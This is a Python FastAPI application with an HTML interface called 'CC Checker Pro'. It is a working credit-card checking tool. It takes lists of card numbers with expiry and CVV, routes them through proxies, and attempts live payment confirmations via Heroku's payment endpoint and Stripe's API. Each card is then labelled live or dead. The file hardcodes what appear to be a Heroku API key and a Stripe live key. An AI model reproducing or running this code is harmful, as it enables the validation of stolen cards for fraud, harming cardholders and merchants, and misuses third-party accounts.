import os
import sys
import uuid
import asyncio
import json
import httpx
import base64
from datetime import datetime
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware

# Auto-install required modules
required_modules = ['fastapi', 'httpx', 'uvicorn']
for module in required_modules:
    try:
        __import__(module.replace('-', '_'))
    except ImportError:
        os.system(f"{sys.executable} -m pip install {module}")

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en" data-theme="light">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CC Checker Pro</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        /* Theme Variables */
        :root[data-theme="light"] {
            --primary-color: #6366f1;
            --primary-hover: #4f46e5;
            --success-color: #22c55e;
            --error-color: #ef4444;
            --warning-color: #eab308;
            --background: #f8fafc;
            --card-bg: #ffffff;
            --text: #1e293b;
            --border: #e2e8f0;
            --shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
        }

        :root[data-theme="dark"] {
            --primary-color: #818cf8;
            --primary-hover: #6366f1;
            --success-color: #34d399;
            --error-color: #f87171;
            --warning-color: #fcd34d;
            --background: #1e293b;
            --card-bg: #0f172a;
            --text: #e2e8f0;
            --border: #334155;
            --shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
        }

        body {
            background: var(--background);
            color: var(--text);
            line-height: 1.6;
            padding: 2rem;
            min-height: 100vh;
            transition: all 0.3s ease;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: var(--card-bg);
            padding: 2rem;
            border-radius: 1rem;
            box-shadow: var(--shadow);
            border: 1px solid var(--border);
        }

        /* Header Section */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 2rem;
        }

        .theme-toggle {
            background: none;
            border: none;
            cursor: pointer;
            font-size: 1.5rem;
            color: var(--text);
        }

        /* Stats Section */
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 1rem;
            margin-bottom: 2rem;
        }

        .stat-card {
            background: var(--card-bg);
            padding: 1rem;
            border-radius: 0.5rem;
            border: 1px solid var(--border);
            text-align: center;
        }

        .stat-value {
            font-size: 1.5rem;
            font-weight: 700;
            color: var(--primary-color);
        }

        .stat-label {
            font-size: 0.875rem;
            color: var(--text);
            opacity: 0.8;
        }

        /* Input Section */
        .input-section {
            margin-bottom: 2rem;
        }

        .input-group {
            margin-bottom: 1rem;
        }

        label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 500;
        }

        textarea {
            width: 100%;
            min-height: 150px;
            padding: 1rem;
            border: 1px solid var(--border);
            border-radius: 0.5rem;
            background: var(--background);
            color: var(--text);
            font-family: monospace;
            resize: vertical;
        }

        /* Buttons */
        .btn-group {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 1rem;
            margin-bottom: 2rem;
        }

        .btn {
            padding: 0.75rem 1.5rem;
            border: none;
            border-radius: 0.5rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
        }

        .btn-primary {
            background: var(--primary-color);
            color: white;
        }

        .btn-primary:hover {
            background: var(--primary-hover);
        }

        .btn-secondary {
            background: var(--text);
            color: var(--card-bg);
        }

        .btn-secondary:hover {
            opacity: 0.9;
        }

        /* Progress Bar */
        .progress-container {
            margin-bottom: 2rem;
            display: none;
        }

        .progress-bar {
            height: 0.5rem;
            background: var(--border);
            border-radius: 1rem;
            overflow: hidden;
        }

        .progress {
            height: 100%;
            background: var(--primary-color);
            width: 0%;
            transition: width 0.3s ease;
        }

        /* Results Section */
        .results {
            margin-top: 2rem;
        }

        .result-card {
            background: var(--background);
            padding: 1rem;
            border-radius: 0.5rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--primary-color);
        }

        .result-card.success {
            border-left-color: var(--success-color);
        }

        .result-card.error {
            border-left-color: var(--error-color);
        }

        /* Animations */
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .result-card {
            animation: slideIn 0.3s ease;
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            .container {
                padding: 1rem;
            }

            .btn-group {
                grid-template-columns: 1fr;
            }

            .stats {
                grid-template-columns: repeat(2, 1fr);
            }
        }

        /* Settings Modal */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            z-index: 1000;
        }

        .modal-content {
            position: relative;
            background: var(--card-bg);
            margin: 2rem auto;
            padding: 2rem;
            max-width: 600px;
            border-radius: 1rem;
            animation: slideIn 0.3s ease;
        }

        .close {
            position: absolute;
            right: 1rem;
            top: 1rem;
            font-size: 1.5rem;
            cursor: pointer;
            color: var(--text);
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <h1>💳 CC Checker Pro</h1>
            <button class="theme-toggle" onclick="toggleTheme()">🌓</button>
        </div>

        <!-- Stats -->
        <div class="stats">
            <div class="stat-card">
                <div class="stat-value" id="totalCount">0</div>
                <div class="stat-label">Total</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="liveCount">0</div>
                <div class="stat-label">Live</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="deadCount">0</div>
                <div class="stat-label">Dead</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="errorCount">0</div>
                <div class="stat-label">Error</div>
            </div>
        </div>

        <!-- Input Section -->
        <div class="input-section">
            <div class="input-group">
                <label>Credit Cards (Format: XXXX|MM|YY|CVV)</label>
                <textarea id="ccs" placeholder="Enter cards (one per line)"></textarea>
            </div>
        </div>

        <!-- Buttons -->
        <div class="btn-group">
            <button class="btn btn-primary" onclick="startChecking()">
                <span>Start Checking</span>
            </button>
            <button class="btn btn-secondary" onclick="openSettings()">
                <span>Settings</span>
            </button>
            <button class="btn btn-secondary" onclick="clearResults()">
                <span>Clear Results</span>
            </button>
            <button class="btn btn-secondary" onclick="exportResults()">
                <span>Export Results</span>
            </button>
        </div>

        <!-- Progress Bar -->
        <div class="progress-container" id="progressContainer">
            <div class="progress-bar">
                <div class="progress" id="progress"></div>
            </div>
            <div style="text-align: center; margin-top: 0.5rem;">
                <span id="progressText">0/0 Checked</span>
            </div>
        </div>

        <!-- Results -->
        <div class="results" id="results"></div>
    </div>

    <!-- Settings Modal -->
    <div class="modal" id="settingsModal">
        <div class="modal-content">
            <span class="close" onclick="closeSettings()">&times;</span>
            <h2>Settings</h2>
            <div class="input-group">
                <label>API Key (Required)</label>
                <input type="text" id="api_key" value="HRKU-dbedf9a3-6946-4206-a197-be6cf5766a40">
            </div>
            <div class="input-group">
                <label>Proxy (Optional)</label>
                <input type="text" id="proxy" placeholder="host:port:user:pass">
            </div>
            <div class="grid">
                <div class="input-group">
                    <label>First Name</label>
                    <input type="text" id="first_name" value="John">
                </div>
                <div class="input-group">
                    <label>Last Name</label>
                    <input type="text" id="last_name" value="Doe">
                </div>
            </div>
            <button class="btn btn-primary" onclick="saveSettings()">Save Settings</button>
        </div>
    </div>

    <script>
        // Global variables
        let settings = {
            api_key: 'HRKU-dbedf9a3-6946-4206-a197-be6cf5766a40',
            proxy: '',
            first_name: 'John',
            last_name: 'Doe'
        };
        let stats = {
            total: 0,
            live: 0,
            dead: 0,
            error: 0
        };
        let checking = false;

        // Theme handling
        function toggleTheme() {
            const html = document.documentElement;
            const currentTheme = html.getAttribute('data-theme');
            const newTheme = currentTheme === 'light' ? 'dark' : 'light';
            html.setAttribute('data-theme', newTheme);
            localStorage.setItem('theme', newTheme);
        }

        // Initialize theme
        document.addEventListener('DOMContentLoaded', () => {
            const savedTheme = localStorage.getItem('theme') || 'light';
            document.documentElement.setAttribute('data-theme', savedTheme);
            loadSettings();
        });

        // Settings handling
        function openSettings() {
            document.getElementById('settingsModal').style.display = 'block';
        }

        function closeSettings() {
            document.getElementById('settingsModal').style.display = 'none';
        }

        function loadSettings() {
            const savedSettings = localStorage.getItem('settings');
            if (savedSettings) {
                settings = JSON.parse(savedSettings);
                for (const [key, value] of Object.entries(settings)) {
                    const element = document.getElementById(key);
                    if (element) element.value = value;
                }
            }
        }

        function saveSettings() {
            settings = {
                api_key: document.getElementById('api_key').value.trim() || 'HRKU-dbedf9a3-6946-4206-a197-be6cf5766a40',
                proxy: document.getElementById('proxy').value.trim(),
                first_name: document.getElementById('first_name').value.trim(),
                last_name: document.getElementById('last_name').value.trim()
            };

            localStorage.setItem('settings', JSON.stringify(settings));
            closeSettings();
            showNotification('Settings saved successfully');
        }

        // Results handling
        function clearResults() {
            document.getElementById('results').innerHTML = '';
            stats = { total: 0, live: 0, dead: 0, error: 0 };
            updateStats();
        }

        function updateStats() {
            document.getElementById('totalCount').textContent = stats.total;
            document.getElementById('liveCount').textContent = stats.live;
            document.getElementById('deadCount').textContent = stats.dead;
            document.getElementById('errorCount').textContent = stats.error;
        }

        function updateProgress(current, total) {
            const progress = document.getElementById('progress');
            const progressText = document.getElementById('progressText');
            const percentage = (current / total) * 100;
            
            progress.style.width = `${percentage}%`;
            progressText.textContent = `${current}/${total} Checked`;
        }

        function addResult(cc, result) {
            stats.total++;
            if (result.status === 'success') stats.live++;
            else if (result.status === 'error') stats.error++;
            else stats.dead++;
            
            updateStats();

            const resultsDiv = document.getElementById('results');
            const statusClass = result.status === 'success' ? 'success' : 
                              result.status === 'error' ? 'error' : '';
            
            const resultHtml = `
                <div class="result-card ${statusClass}">
                    <div style="display: flex; justify-content: space-between;">
                        <strong>CC:</strong> ${cc}
                        <span class="status-badge ${result.status}">${result.status.toUpperCase()}</span>
                    </div>
                    <div>Message: ${result.message}</div>
                    <div style="font-size: 0.8rem; color: var(--text-secondary);">
                        Checked at: ${result.timestamp}
                    </div>
                </div>
            `;
            resultsDiv.insertAdjacentHTML('afterbegin', resultHtml);
        }

        function showNotification(message, type = 'success') {
            const notification = document.createElement('div');
            notification.className = `notification ${type}`;
            notification.textContent = message;
            document.body.appendChild(notification);
            
            setTimeout(() => {
                notification.remove();
            }, 3000);
        }

        function exportResults() {
            const results = document.getElementById('results').innerHTML;
            const statsData = JSON.stringify(stats, null, 2);
            const exportData = `
                <html>
                <head>
                    <title>CC Checker Results</title>
                    <style>
                        body { font-family: Arial, sans-serif; padding: 20px; }
                        .stats { margin-bottom: 20px; }
                        ${document.querySelector('style').innerHTML}
                    </style>
                </head>
                <body>
                    <h1>CC Checker Results</h1>
                    <div class="stats">
                        <pre>${statsData}</pre>
                    </div>
                    <div class="results">
                        ${results}
                    </div>
                </body>
                </html>
            `;
            
            const blob = new Blob([exportData], { type: 'text/html' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `cc-checker-results-${new Date().toISOString().slice(0,10)}.html`;
            a.click();
            URL.revokeObjectURL(url);
        }

        async function startChecking() {
            if (checking) {
                showNotification('Already checking cards', 'warning');
                return;
            }

            const ccs = document.getElementById('ccs').value.trim().split('\n').filter(cc => cc.trim());
            if (ccs.length === 0) {
                showNotification('Please enter credit cards to check', 'error');
                return;
            }

            checking = true;
            document.getElementById('progressContainer').style.display = 'block';
            clearResults();

            let current = 0;
            const total = ccs.length;

            for (const cc of ccs) {
                try {
                    const response = await fetch('/check_cc', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ cc, settings })
                    });
                    const result = await response.json();
                    addResult(cc, result);
                } catch (error) {
                    addResult(cc, {
                        status: 'error',
                        message: 'Request failed',
                        timestamp: new Date().toLocaleTimeString()
                    });
                }
                
                current++;
                updateProgress(current, total);
                
                // Add a small delay between requests
                await new Promise(resolve => setTimeout(resolve, 1000));
            }

            checking = false;
            showNotification('Checking completed');
        }

        // Close settings modal when clicking outside
        window.onclick = function(event) {
            const modal = document.getElementById('settingsModal');
            if (event.target === modal) {
                closeSettings();
            }
        }
    </script>
</body>
</html>
'''

# Backend Logic
async def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"

async def make_request(url, method="POST", params=None, headers=None, data=None, json_data=None, proxy=None):
    proxies = None
    if proxy:
        proxy_parts = proxy.split(':')
        if len(proxy_parts) == 4:
            host, port, user, password = proxy_parts
            proxies = {
                "http://": f"http://{user}:{password}@{host}:{port}",
                "https://": f"http://{user}:{password}@{host}:{port}",
            }

    async with httpx.AsyncClient(proxies=proxies) as client:
        try:
            response = await client.request(method, url, params=params, headers=headers, data=data, json=json_data)
            return response.text
        except httpx.RequestError as e:
            print(f"Request error: {e}")
            return None

async def heroku(cc, api_key, proxy=None, first_name=None, last_name=None, line1=None, city=None, state=None, postal_code=None, country=None):
    try:
        cc_data = cc.split("|")
        if len(cc_data) != 4:
            return {"status": "error", "message": "Invalid CC format"}
            
        cc, mon, year, cvv = cc_data
        guid = str(uuid.uuid4())
        muid = str(uuid.uuid4())
        sid = str(uuid.uuid4())

        headers = {
            "accept": "application/vnd.heroku+json; version=3",
            "accept-language": "en-US,en;q=0.9",
            "authorization": f"Bearer {api_key}",
            "origin": "https://dashboard.heroku.com",
            "user-agent": "Mozilla/5.0",
        }

        url = "https://api.heroku.com/account/payment-method/client-token"
        req = await make_request(url, headers=headers, proxy=proxy)
        
        if not req:
            return {"status": "error", "message": "Failed to get client token"}
            
        client_secret = await parseX(req, '"token":"', '"')

        headers2 = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
        }

        name = f"{first_name} {last_name}" if first_name and last_name else "John Doe"
        data = {
            "type": "card",
            "billing_details[name]": name,
            "billing_details[address][city]": city or "New York",
            "billing_details[address][country]": country or "US",
            "billing_details[address][line1]": line1 or "123 Test St",
            "billing_details[address][postal_code]": postal_code or "10001",
            "billing_details[address][state]": state or "NY",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_month]": mon,
            "card[exp_year]": year,
            "guid": guid,
            "muid": muid,
            "sid": sid,
            "key": "pk_live_51KlgQ9Lzb5a9EJ3IaC3yPd1x6i9e6YW9O8d5PzmgPw9IDHixpwQcoNWcklSLhqeHri28drHwRSNlf6g22ZdSBBff002VQu6YLn",
        }

        req2 = await make_request("https://api.stripe.com/v1/payment_methods", headers=headers2, data=data, proxy=proxy)
        if not req2 or "pm_" not in req2:
            return {"status": "error", "message": "Invalid card number"}

        json_sec = json.loads(req2)
        pmid = json_sec["id"]
        piid = client_secret.split("_secret_")[0]

        headers3 = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
        }
        
        data3 = {
            "payment_method": pmid,
            "expected_payment_method_type": "card",
            "use_stripe_sdk": "true",
            "key": "pk_live_51KlgQ9Lzb5a9EJ3IaC3yPd1x6i9e6YW9O8d5PzmgPw9IDHixpwQcoNWcklSLhqeHri28drHwRSNlf6g22ZdSBBff002VQu6YLn",
            "client_secret": client_secret,
        }

        req3 = await make_request(f"https://api.stripe.com/v1/payment_intents/{piid}/confirm", headers=headers3, data=data3, proxy=proxy)
        if not req3:
            return {"status": "error", "message": "Failed to confirm payment"}

        ljson = json.loads(req3)
        if '"status": "succeeded"' in req3:
            return {"status": "success", "message": "Payment successful"}
        elif "insufficient_funds" in req3:
            return {"status": "success", "message": "Card Live - Insufficient Funds"}
        elif "decline_code" in req3:
            return {"status": "declined", "message": "Card declined"}
        elif "requires_action" in req3:
            return {"status": "3d_secure", "message": "3D Secure Required"}
        elif "error" in req3:
            return {"status": "error", "message": ljson["error"]["message"]}
        else:
            return {"status": "unknown", "message": "Unknown Response"}

    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.get("/", response_class=HTMLResponse)
async def index(request: Request):
    return HTMLResponse(content=HTML_TEMPLATE)

@app.post("/check_cc")
async def check_cc(request: Request):
    try:
        data = await request.json()
        cc = data.get('cc')
        settings = data.get('settings', {})
        
        if not settings.get('api_key'):
            settings['api_key'] = 'HRKU-dbedf9a3-6946-4206-a197-be6cf5766a40'

        result = await heroku(
            cc,
            settings.get('api_key'),
            settings.get('proxy'),
            settings.get('first_name'),
            settings.get('last_name'),
            settings.get('line1'),
            settings.get('city'),
            settings.get('state'),
            settings.get('postal_code'),
            settings.get('country')
        )
        result['timestamp'] = datetime.now().strftime('%H:%M:%S')
        return result
    except Exception as e:
        return {
            "status": "error",
            "message": str(e),
            "timestamp": datetime.now().strftime('%H:%M:%S')
        }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000, reload=True)
